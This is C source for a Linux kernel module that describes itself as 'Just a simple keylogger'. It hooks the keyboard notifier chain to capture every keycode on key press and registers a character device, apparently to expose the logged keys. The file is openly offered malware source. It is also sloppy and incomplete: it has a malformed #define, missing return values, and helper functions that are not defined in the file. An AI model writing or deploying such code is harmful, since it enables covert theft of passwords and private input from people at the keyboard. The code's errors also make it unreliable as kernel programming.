#include "keylogger.h"
MODULE_LICENSE("GPL");
MODULE_AUTHOR("8xbit");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("Just a simple keylogger");
MODULE_SUPPORTED_DEVICE("Not machine dependent");
#define PATH = /tmp 
/*charcter dvice Shit*/

char const *chardev_name ="keylogger";
static struct file_operations fops =
{
    .owner = THIS_MODULE, 
    .read = device_read
};

/**/
int notifier(struct notifier_block *block, unsigned long code, void *p)
{
    struct keyboard_notifier_param *param;
    param =(struct keyboard_notifier_param*) p;
    int key;
    /*needs to conect to the char dvice*/
    if (code == KBD_KEYCODE && param->down)
    {
        key = param->value; 
        update_key(p);
    }
    return NOTIFY_OK;
}
static struct notifier_block keylogger ={.notifier_call = notifier};






static int __init MOD_LOAD(void)
{
    /*call the notifier*/
    register_chrdev(123, "keylogger", &fops);
    register_keyboard_notifier(&keylogger);

}
static void __exit MOD_UNLOAD(void)
{
    unregister_keyboard_notifier(&keylogger);
} 
module_init(MOD_LOAD);
module_exit(MOD_UNLOAD);